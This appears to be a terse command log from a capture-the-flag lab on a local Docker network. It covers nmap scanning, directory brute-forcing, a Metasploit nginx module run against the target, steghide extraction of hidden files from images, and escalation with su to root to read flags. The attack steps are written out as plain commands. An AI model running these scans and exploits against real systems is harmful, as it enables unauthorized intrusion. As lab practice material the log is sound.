nmap -sn 172.17.0/24
nmap -p- -Pn -sV -O 172.17.0.2 -sC
python3 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u 172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

msfconsole
search nginx
use 3
set rhosts 172.17.0.2
set targeturi /phpinfo.php
run

ls -la
cd admin
ls -la
cat .flag.txt

python3 -m http.server 8080
wget http://172.17.0.2:8080/ImagenADescargar
steghide extract -sf 1.jpg
cat s1
steghide extract -sf 3.jpg
cat s2
steghide extract -sf 11.jpg
cat s3
su root
(password)
ls -la
cat .flag.txt